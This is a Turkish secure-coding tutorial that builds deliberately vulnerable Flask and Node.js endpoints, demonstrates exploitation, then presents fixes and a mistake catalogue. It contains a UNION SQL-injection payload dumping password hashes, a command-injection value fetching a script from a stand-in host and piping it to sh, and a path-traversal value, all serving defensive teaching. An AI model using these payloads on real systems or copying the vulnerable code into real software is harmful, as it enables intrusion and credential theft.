# Güvenli Kod Yazımı — Derin Dalış

Özet makale güvenli kodun dört taşını (girdi doğrulama, veri/kod ayrımı, en az yetki, sır yönetimi) ve arkalarındaki zihniyeti kurdu. Bu derin dalış, o prensipleri tek bir gerçekçi sistem üzerinde *çalışan kodla* ete kemiğe büründürür: önce zafiyetli kodu yazar, sonra sömürüyü adım adım gösterir, sonra düzeltir. Amaç "güvenli yazın" demek değil; bir açığın nasıl doğduğunu byte düzeyinde görmek ve düzeltmenin neden yapısal olarak işe yaradığını anlamaktır.

Örneklerin çoğu Python ve Flask ile, biri Node.js ile yazıldı; ancak anlatılan hatalar dile özgü değil, evrenseldir. Dili değiştirin, hata aynı kalır.

## 1. Çözümlü yürüyüş: Bir kullanıcı profil servisi nasıl ele geçirilir

Elimizde küçük bir web servisi olsun: kullanıcılar giriş yapıyor, profil fotoğrafı yüklüyor ve isme göre başka kullanıcı arayabiliyor. Bu üç uç noktanın her birinde ayrı bir sınıf hata göreceğiz. Önce tümüyle zafiyetli sürümü yazalım — bu, gerçekte prodüksiyonda karşılaşacağınız türden, "çalışan ama sömürülebilir" koddur.

### Zafiyetli sürüm

```python
import sqlite3
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)
DB = "app.db"

# --- Zafiyet 1: SQL injection ---
@app.route("/ara")
def ara():
    isim = request.args.get("isim", "")
    conn = sqlite3.connect(DB)
    # Kullanıcı verisi doğrudan sorgu metnine birleştiriliyor
    sorgu = f"SELECT id, kullanici_adi, eposta FROM kullanicilar WHERE kullanici_adi LIKE '%{isim}%'"
    satirlar = conn.execute(sorgu).fetchall()
    conn.close()
    return jsonify(satirlar)

# --- Zafiyet 2: Komut enjeksiyonu + path traversal ---
@app.route("/kucuk-resim")
def kucuk_resim():
    dosya = request.args.get("dosya", "")
    # Kullanıcının verdiği dosya adı doğrudan kabuk komutuna gömülüyor
    cikti = f"/var/thumbs/{dosya}.png"
    komut = f"convert /var/uploads/{dosya} -resize 128x128 {cikti}"
    subprocess.run(komut, shell=True)
    return jsonify({"thumb": cikti})

# --- Zafiyet 3: En az yetki ihlali (aşağıda açıklanıyor) ---
if __name__ == "__main__":
    app.run(debug=True)   # debug=True prodüksiyonda RCE penceresidir
```

Bu kod derlenir, testleri geçer ("Ali" arayınca Ali'yi bulur, `avatar.jpg` verince küçük resmini üretir) ve demo'da kusursuz görünür. Sorun, mutlu yolun dışında başlar.

### Sorun 1: `/ara` — tek tırnak veri sınırını kırıyor

`isim` parametresi `f"...'%{isim}%'..."` içine gömülüyor. Saldırgan tarayıcıya şunu yazsın:

```
/ara?isim=%' UNION SELECT id, kullanici_adi, parola_hash FROM kullanicilar --
```

Sunucuda oluşan sorgu:

```sql
SELECT id, kullanici_adi, eposta FROM kullanicilar
WHERE kullanici_adi LIKE '%%' UNION SELECT id, kullanici_adi, parola_hash FROM kullanicilar --%'
```

`--` sonrası yorum satırı olduğu için kapanış `%'` etkisiz kalır. Sonuç: `eposta` kolonunun geldiği yere artık `parola_hash` geliyor. Saldırgan tek istekle tüm parola hash'lerini çekti. Kök neden özet makaledeki tanımın ta kendisi: **tek tırnak, SQLite için "dize verisi bitti, komut başlıyor" diyen bir kontrol karakteridir**; kullanıcı verisi bu sınırı aşıp komut alanına taştı.

### Sorun 2: `/kucuk-resim` — `shell=True` metakarakterleri canlandırıyor

İki ayrı hata iç içe. Birincisi, `dosya` değeri `/var/uploads/{dosya}` yoluna gömülüyor; `dosya=../../etc/passwd` göndermek klasik path traversal'dır. İkincisi ve daha kötüsü, `subprocess.run(komut, shell=True)` komutu bir kabuk üzerinden çalıştırdığı için `;`, `|`, `$()` anlam kazanır:

```
/kucuk-resim?dosya=x;curl%20evil.sh|sh;
```

Kabukta çalışan komut:

```sh
convert /var/uploads/x -resize 128x128 /var/thumbs/x;curl evil.sh|sh;.png
```

`;` ile `convert` biter, `curl evil.sh | sh` çalışır — uzaktan kod çalıştırma (remote code execution). Kök neden: veri (dosya adı) kod (kabuk komutu) ile tek metin dizesinde eritildi.

### Düzeltilmiş sürüm

```python
import re
import sqlite3
import subprocess
from pathlib import Path
from flask import Flask, request, jsonify, abort

app = Flask(__name__)
DB = "app.db"

UPLOAD_DIR = Path("/var/uploads").resolve()
THUMB_DIR = Path("/var/thumbs").resolve()
# Allowlist: dosya adı yalnızca bu desene uyabilir
DOSYA_DESENI = re.compile(r"^[a-zA-Z0-9_-]{1,64}\.(jpg|jpeg|png)$")

@app.route("/ara")
def ara():
    isim = request.args.get("isim", "")
    if len(isim) > 64:                      # uzunluk sınırı: DoS ve aşırı yük savunması
        abort(400, "arama terimi çok uzun")
    conn = sqlite3.connect(DB)
    # Parametreli sorgu: yapı sabit, kullanıcı verisi ayrı kanaldan gidiyor
    desen = f"%{isim}%"                       # LIKE joker'i veri tarafında kalır
    satirlar = conn.execute(
        "SELECT id, kullanici_adi, eposta FROM kullanicilar "
        "WHERE kullanici_adi LIKE ? ESCAPE '\\'",
        (desen.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_") + "%",),
    ).fetchall()
    conn.close()
    return jsonify([{"id": r[0], "kullanici_adi": r[1], "eposta": r[2]} for r in satirlar])

@app.route("/kucuk-resim")
def kucuk_resim():
    dosya = request.args.get("dosya", "")
    if not DOSYA_DESENI.match(dosya):        # allowlist: reddet, temizleme deme
        abort(400, "geçersiz dosya adı")
    kaynak = (UPLOAD_DIR / dosya).resolve()
    # Kanonik yol gerçekten UPLOAD_DIR içinde mi? (traversal'a karşı ikinci kat)
    if UPLOAD_DIR not in kaynak.parents:
        abort(400, "geçersiz yol")
    hedef = THUMB_DIR / (Path(dosya).stem + ".png")
    # shell=False + argüman listesi: kabuk hiç devreye girmez
    subprocess.run(
        ["convert", str(kaynak), "-resize", "128x128", str(hedef)],
        check=True, timeout=10,
    )
    return jsonify({"thumb": str(hedef)})
```

`/ara`'da düzeltmenin özü `?` parametresidir: sorgunun *yapısı* SQLite'a önceden, veriden bağımsız gönderilir; `?` konumundaki değer her zaman saf veri olarak muamele görür. Buradaki ek incelik, `LIKE` sorgularına özgü ve gerçek kodda sık atlanan bir noktadır: parametreleştirme SQL injection'ı kapatır ama kullanıcının verdiği `%` ve `_` hâlâ LIKE joker'i olarak yorumlanır (fonksiyonel bir hata, bir güvenlik açığı değil daha küçük bir sızıntı). Bu yüzden `ESCAPE` ile bu joker'leri de kaçırdık.

Bir noktanın altını çizmek gerekir çünkü sık bir yanılgıdır: parametreleştirme "tek tırnağı kaçırmak" değildir. İçeride kaçış da olmaz. Veritabanı sürücüsü, sorgu metnini ve parametre değerlerini iki *ayrı kanaldan* protokol seviyesinde gönderir (SQLite'ta `sqlite3_bind_text`, PostgreSQL wire protokolünde ayrı bir `Bind` mesajı gibi). Değer hiçbir zaman sorgu metnine geri yazılmaz; dolayısıyla "kaçışı unutma" ya da "multibyte kenar durumu" diye bir kategori kalmaz. Bu, string escaping'in kategorik olarak üstünde olmasının teknik sebebidir: escaping doğru yapılabilir ama *yapılmayabilir de*; parametreleştirmede enjeksiyon yapısal olarak imkânsızdır, dikkatli olmaya bağlı değildir.

`/kucuk-resim`'de iki bağımsız düzeltme var: allowlist deseni (biçim doğrulama), kanonik yol kontrolü (traversal savunması, derinlemesine savunma olarak) ve `shell=False` (veri/kod ayrımı — argüman listesi kabuk ayrıştırmasını tamamen ortadan kaldırır). Üçü de gereklidir; biri diğerinin yedeğidir.

### Sorun 3: yıkım yarıçapı — düzeltme yetmez, sınırlandırma gerekir

Diyelim `/ara`'daki hatayı fark etmeden önce saldırgan hash'leri çekti. Eğer uygulama veritabanına `SELECT/INSERT/UPDATE/DELETE` yetkili tek bir admin hesabıyla bağlanıyorsa, bir UNION-based okuma açığı, bir `UPDATE ... SET rol='admin'` açığına da (başka bir enjeksiyon noktası bulunursa) kapı aralar. En az yetki uygulamak, uygulamanın bağlantı kullanıcısını yalnızca gerçekten kullandığı tablolara ve işlemlere kısıtlamaktır. Bu, koddaki hatayı düzeltmez ama düzeltemediğiniz hatanın maliyetini düşürür — özet makaledeki "kayıp önleyici" rolü tam olarak budur.

## 2. Gerçek sistem örneği: Parola sıfırlama token'ı üreten bir servis

Enjeksiyon açıkları görünürdür; daha sinsi olanlar kriptografik ve mantıksal hatalardır. Gerçek bir vaka üzerinden gidelim: bir SaaS'ın "parolamı unuttum" akışı. Kullanıcı e-posta girer, sistem bir token üretir, e-postayla linki gönderir, kullanıcı linke tıklayıp yeni parola belirler. Basit görünür; her adımda ayrı bir tuzak vardır.

### Zafiyetli sürüm (Node.js / Express)

```javascript
const crypto = require("crypto");
const express = require("express");
const app = express();
app.use(express.json());

const tokenlar = new Map();  // token -> { epostaHash, sonKullanma }

app.post("/sifre-sifirla-iste", (req, res) => {
  const { eposta } = req.body;
  const kullanici = kullaniciBul(eposta);
  if (!kullanici) {
    // Zafiyet A: kullanıcı sayımı (enumeration)
    return res.status(404).json({ hata: "Böyle bir kullanıcı yok" });
  }
  // Zafiyet B: zayıf token — tahmin edilebilir
  const token = Math.random().toString(36).slice(2);
  tokenlar.set(token, { eposta, sonKullanma: Date.now() + 3600_000 });
  epostaGonder(eposta, `https://app.example.com/sifirla?token=${token}`);
  return res.json({ mesaj: "E-posta gönderildi" });
});

app.post("/sifre-sifirla-uygula", (req, res) => {
  const { token, yeniSifre } = req.body;
  const kayit = tokenlar.get(token);
  if (!kayit) return res.status(400).json({ hata: "Geçersiz token" });
  // Zafiyet C: süre kontrolü yok — token sonsuza dek geçerli
  sifreGuncelle(kayit.eposta, yeniSifre);
  return res.json({ mesaj: "Şifre güncellendi" });
});
```

Bu kod "çalışır". Ama en az dört ayrı açık barındırır:

- **A — Kullanıcı sayımı:** "Böyle bir kullanıcı yok" mesajı, saldırgana hangi e-postaların kayıtlı olduğunu söyler. Kayıtlı e-posta listesi tek başına bir gizlilik ihlali ve hedefli saldırı (phishing, credential stuffing) için hammaddedir.
- **B — Tahmin edilebilir token:** `Math.random()` kriptografik değildir; iç durumu gözlemlenerek gelecekteki çıktılar öngörülebilir. Saldırgan başkasının token'ını üretip hesabını ele geçirebilir.
- **C — Süre denetimi yok:** `sonKullanma` yazılıyor ama okunmuyor. Bir kez sızan link kalıcı bir arka kapıdır.
- **D — Zamanlama sızıntısı:** `tokenlar.get(token)` ve string karşılaştırmaları timing'e duyarlı olabilir; ayrıca token doğrudan Map anahtarı olarak saklanıyor, veritabanı sızarsa hepsi düz metin.

### Düzeltilmiş sürüm

```javascript
const crypto = require("crypto");

app.post("/sifre-sifirla-iste", (req, res) => {
  const { eposta } = req.body;
  const kullanici = kullaniciBul(eposta);
  // A düzeltmesi: yanıt her durumda aynı — sayım imkânsız
  if (kullanici) {
    // B düzeltmesi: kriptografik olarak güçlü, 256-bit token
    const hamToken = crypto.randomBytes(32).toString("base64url");
    // D düzeltmesi: depoya token'ın kendisi değil, hash'i yazılır
    const tokenHash = crypto.createHash("sha256").update(hamToken).digest("hex");
    tokenKaydet({
      kullaniciId: kullanici.id,
      tokenHash,
      sonKullanma: Date.now() + 15 * 60_000,  // C: 15 dakika, kısa ömür
      kullanildi: false,
    });
    epostaGonder(eposta, `https://app.example.com/sifirla?token=${hamToken}`);
  }
  // Kullanıcı olsa da olmasa da aynı yanıt, aynı gecikme profili
  return res.json({ mesaj: "Eğer bu e-posta kayıtlıysa, sıfırlama linki gönderildi." });
});

app.post("/sifre-sifirla-uygula", (req, res) => {
  const { token, yeniSifre } = req.body;
  if (typeof token !== "string" || typeof yeniSifre !== "string") {
    return res.status(400).json({ hata: "Geçersiz istek" });
  }
  const tokenHash = crypto.createHash("sha256").update(token).digest("hex");
  const kayit = tokenBulHashIle(tokenHash);   // DB'de indeksli hash araması
  // C düzeltmesi: süre ve tek-kullanımlık kontrolü
  if (!kayit || kayit.kullanildi || Date.now() > kayit.sonKullanma) {
    return res.status(400).json({ hata: "Geçersiz veya süresi dolmuş token" });
  }
  parolaPolitikasiDogrula(yeniSifre);          // uzunluk/karmaşıklık allowlist'i
  sifreGuncelleId(kayit.kullaniciId, yeniSifre);
  tokenKullanildiIsaretle(kayit.id);           // tekrar kullanımı önle
  return res.json({ mesaj: "Şifre güncellendi" });
});
```

Bu vaka dört prensibi de bir arada gösterir. **Sır yönetimi:** token depoda hash'lenmiş tutuluyor — veritabanı sızsa bile ham token yok, tıpkı parolaların hash'lenmesi gibi. **En az yetki + zaman boyutu:** token 15 dakikalık ve tek kullanımlık; sızsa bile penceresi dar. **Girdi doğrulama:** yeni parola bir politikadan geçiyor, `token`/`yeniSifre` tip kontrolü var. **Veri/kod ayrımı** doğrudan görünmez ama `tokenBulHashIle` altında parametreli sorgu olmalıdır.

Buradaki en önemli mimari ders, güvenliğin sadece "kötü karakter filtrelemek" olmadığıdır: kullanıcı sayımı hatasında hiçbir enjeksiyon yok, hiçbir tehlikeli karakter yok — hata, sistemin *farklı durumlar için farklı davranması* ve bu farkın bilgi sızdırmasıdır. Güvenli tasarım "gözlemlenebilir davranış saldırgana ne öğretiyor?" sorusunu sorar.

Bu vakada gizli ama kritik bir ayrıntı, yanıtların yalnızca *içerik* olarak değil *zamanlama* olarak da ayırt edilemez olması gerektiğidir. Düzelttiğimiz sürümde kullanıcı yoksa hiç token üretmiyoruz; bu, "kullanıcı var" dalında `crypto.randomBytes` + hash + DB yazması, "kullanıcı yok" dalında ise hiçbir iş yapılmaması demektir. Saldırgan yanıt gecikmesini ölçerek yine sayım yapabilir — bu bir *timing side-channel*'dır. Titiz bir uygulama, kullanıcı bulunamadığında bile eşdeğer maliyetli bir "kukla" iş yürütür (sabit bir hash hesabı gibi) ya da her iki dalı da bir işe kuyruğa atıp yanıtı anında döner. Ders şudur: bir bilgi sızıntısını kapatırken sızıntının *tüm gözlemlenebilir kanallarını* düşünmek gerekir; içerik, durum kodu, header, yanıt boyutu ve süre bunların hepsidir.

Aynı sınıftan ikinci bir örnek, sık karşılaşılan **IDOR** (Insecure Direct Object Reference) hatasıdır. `GET /fatura/8842` uç noktası, isteği yapan kullanıcının 8842 numaralı faturanın *sahibi* olup olmadığını kontrol etmezse, saldırgan numarayı `8843`, `8844` diye artırarak başkalarının faturalarını okur. Burada da enjeksiyon yok, tehlikeli karakter yok; hata, "bu ID'yi isteyen kişi bu kaynağa erişmeye yetkili mi?" sorusunun hiç sorulmamasıdır. Doğru kod her sorguya sahiplik koşulunu ekler: `SELECT ... FROM fatura WHERE id = ? AND kullanici_id = ?`, ikinci parametre oturumdaki kimlikten gelir, istekten değil.

## 3. Karşılaştırma / karar: Savunma seçenekleri ve takasları

Aynı tehdide karşı birden fazla savunma vardır ve "en güvenli" olan her zaman doğru cevap değildir; maliyet, sürtünme ve yanlış-pozitif oranı da kararın parçasıdır. Birkaç kritik seçimi takaslarıyla açalım.

### Enjeksiyon savunması: parametreleştirme vs. kaçış vs. allowlist doğrulama

| Yaklaşım | Güç | Zayıflık | Ne zaman |
|---|---|---|---|
| Parametreli sorgu / prepared statement | Yapısal olarak enjeksiyonu imkânsız kılar; unutmak zor | Tablo/kolon adları parametreleştirilemez | Değerler için **daima birinci tercih** |
| Kaçış (escaping) / encoding | Parametreleştirmenin mümkün olmadığı yerlerde (ör. dinamik identifier) tek çare | Bağlama duyarlı; yanlış bağlam = açık; el yordamı hata riski yüksek | Yalnızca yapısal seçenek yoksa, kütüphane fonksiyonuyla |
| Allowlist doğrulama | Kod/kolon adı gibi parametreleştirilemeyen girdiler için sağlam | Değer enjeksiyonuna karşı tek başına yetersiz | Dinamik identifier'ları sabit bir izinli kümeye eşleyerek |

Karar kuralı: **değerler için parametreleştir; parametreleştiremediğin yapısal öğeler (kolon adı, ORDER BY yönü) için sabit bir allowlist'ten seç.** Kaçış son çaredir, birincil savunma değildir. Örneğin dinamik sıralama:

```python
# YANLIŞ: kolon adı doğrudan sorguya
sorgu = f"SELECT * FROM urunler ORDER BY {kolon}"
# DOĞRU: allowlist eşlemesi
IZINLI = {"fiyat": "fiyat", "ad": "ad", "tarih": "olusturma_tarihi"}
kolon_sql = IZINLI.get(kolon)
if kolon_sql is None:
    abort(400)
sorgu = f"SELECT * FROM urunler ORDER BY {kolon_sql}"  # artık kullanıcı verisi değil
```

### Sır saklama: env değişkeni vs. sır kasası (vault)

Ortam değişkenleri basittir, her platformda çalışır, sıfır bağımlılık gerektirir. Ama süreç ortamı `/proc/<pid>/environ` üzerinden okunabilir, crash dump'larına ve hata raporlarına sızabilir, ve döndürme (rotation) manueldir. Adanmış bir kasa (Vault, cloud secret manager) merkezî döndürme, erişim denetimi (audit log) ve kısa ömürlü dinamik kimlik bilgileri sunar — ama operasyonel karmaşıklık, ek bir bağımlılık ve "kasaya erişim sırrının kendisi nerede?" (bootstrapping) problemi getirir.

Karar kuralı: **Erken aşama / küçük ekip için `.gitignore`'lu env yeterli bir başlangıçtır; birden çok servis, uyumluluk (compliance) gereksinimi veya düzenli döndürme ihtiyacı belirdiğinde kasaya geçin.** Aşırı mühendislik de bir maliyettir; üç kişilik bir startup'a Vault kurmak, çözdüğünden fazla operasyonel risk yaratabilir.

### Parola saklama: bcrypt vs. Argon2 vs. scrypt

Üçü de kasıtlı olarak yavaş, tuzlanmış (salted) parola hash fonksiyonlarıdır; hiçbiri "yanlış" değildir. **Argon2id** bugün en modern seçenektir, hem bellek-sertliği (memory-hardness) hem hesaplama maliyetini ayarlar, GPU/ASIC saldırılarına en dirençlisidir. **bcrypt** olgun, her yerde mevcut ve savaşta sınanmıştır ama 72 byte girdi sınırı ve düşük bellek maliyeti gibi kısıtları vardır. **scrypt** bellek-sert ama parametre ayarı daha zahmetlidir. Karar kuralı: **yeni sistemde Argon2id; mevcut/olgun bir bcrypt kullanan sistemde bcrypt'te kalmak da savunulabilir.** Asla düz SHA-256/MD5 kullanmayın — bunlar hızlı olmak için tasarlanmıştır, yani saldırgan için de hızlıdır.

### "Fail open" vs. "fail closed"

Bir yetki kontrolü servisi çöktüğünde ne olmalı? **Fail open** (erişimi ver) kullanılabilirliği korur ama güvenliği çökertir — auth servisi düşünce herkes içeri girer. **Fail closed** (erişimi reddet) güvenliği korur ama bir aksaklık tüm kullanıcıları dışarıda bırakabilir. Güvenlik-kritik yollarda kural nettir: **fail closed.** Ama körlemesine değil — bir ödeme sisteminde fraud servisi çökünce tüm ödemeleri reddetmek iş kaybı demektir; burada karar iş riski ile güvenlik riskinin tartılmasıdır. İlke: *emin olmadığında reddet*, ama hangi yolların gerçekten güvenlik-kritik olduğunu bilinçli seç.

## 4. Hata-modu kataloğu

Aşağıdaki hatalar, gerçek kod tabanlarında tekrar tekrar görülen kalıplardır. Her biri bir cümlelik teşhis ve tuzağın özüyle.

1. **İstemci tarafı doğrulamaya güvenmek.** JavaScript'teki form kontrolü yalnızca UX içindir; saldırgan `curl` ile isteği doğrudan gönderir, dolayısıyla her doğrulama sunucuda tekrarlanmalıdır.

2. **Normalleştirmeden önce doğrulamak.** Önce doğrulayıp sonra URL-decode veya Unicode normalizasyon yaparsanız, doğruladığınız dize ile kullandığınız dize farklı olur; sıra daima "önce kanonikleştir, sonra doğrula, sonra kullan" olmalıdır.

3. **`==` ile sır/token karşılaştırmak.** Sıradan string karşılaştırması ilk farklı byte'ta durup zamanlama sızdırır; token ve HMAC karşılaştırmaları sabit-zamanlı fonksiyonlarla (`hmac.compare_digest`, `crypto.timingSafeEqual`) yapılmalıdır.

4. **Hata mesajında iç bilgi ifşa etmek.** Stack trace'i, SQL sorgusunu veya "kullanıcı yok / parola yanlış" ayrımını kullanıcıya göstermek, saldırgana sistem haritası ve enumeration hediyesi verir; dışarıya jenerik, log'a ayrıntılı mesaj kuralı geçerlidir.

5. **Kendi kripto/kaçış fonksiyonunu yazmak.** Tek tırnağı ikiye katlayan ev yapımı escaper veya "şifreleme" niyetiyle XOR, multibyte kenar durumlarında ve kriptanalizde çöker; daima platformun sınanmış kütüphanesini kullanın.

6. **`shell=True` / string komut çalıştırmak.** Kullanıcı verisini kabuk komut dizesine gömmek `;`, `|`, `$()` metakarakterlerini canlandırır; komutu argüman listesiyle (`shell=False`) çağırmak kabuğu tamamen devreden çıkarır.

7. **Sırrı versiyon kontrolüne göndermek.** Bir API anahtarını commit'leyip sonraki commit'te silmek işe yaramaz; git geçmişi kalıcıdır, dolayısıyla o sır yanmış sayılır ve derhal döndürülmelidir.

8. **Deserializasyona güvenmek.** Güvenilmez veriyi `pickle`, `yaml.load` (güvensiz loader) veya native object deserializer ile açmak, veriyi kod çalıştırmaya çevirir; daima `json` gibi veri-yalnızca formatları veya güvenli loader'ları kullanın.

9. **Yetki kontrolünü yalnızca UI'da yapmak.** "Sil" düğmesini gizlemek yetki değildir; her hassas uç nokta, isteği yapanın *o kaynağı* değiştirme hakkı olduğunu sunucuda bağımsız doğrulamalıdır (IDOR / broken access control'ün kaynağı budur).

10. **Kütüphaneyi güncel tutmamak.** Bilinen açığı olan (CVE'li) bir bağımlılığı sürdürmek, saldırgana hazır bir sömürü verir; bağımlılık taraması (SCA) ve düzenli güncelleme rutine bağlanmalıdır.

11. **Rastgeleliği `Math.random`/`rand()` ile üretmek.** Token, oturum kimliği veya nonce için genel amaçlı PRNG öngörülebilirdir; güvenlik bağlamında yalnızca kriptografik CSPRNG (`crypto.randomBytes`, `secrets` modülü) kullanılmalıdır.

12. **Doğrulamayı temizleme (sanitization) ile karıştırmak.** Tehlikeli karakterleri sessizce silmek, öngörülemeyen çıktı üretir ve bazen filtreyi aşacak yeni bir dize doğurur (`<scr<script>ipt>` → `<script>`); kural, değiştirmek değil reddetmektir.

## Kapanış

Bu derin dalışın bütün örnekleri tek bir düşünce hattını izler: bir açık, "kötü bir karakter" değil, bir *güven varsayımının yanlış yerde yapılmasıdır*. `/ara`'da veriye "sen komut değilsin" diye güvendik; parola sıfırlamada `Math.random`'a "sen tahmin edilemezsin" diye güvendik; `shell=True`'da kabuğa "bu string zararsız" diye güvendik. Düzeltmelerin hepsi aynı biçimdedir: güveni koddan sökmek ve yerine yapısal bir garanti koymak — parametreleştirme, CSPRNG, argüman listesi, allowlist, kısa-ömürlü token.

Güvenli kod, ekstra bir kontrol listesi değil, her güven sınırında "buraya gelen veri neden güvenilir olsun?" diye durmayı refleks hâline getirmektir. Ve her katmanın bir gün delineceğini varsayarak bir sonrakini hazır tutmaktır: en az yetki, düzeltemediğiniz hatayı bile ucuzlatır.
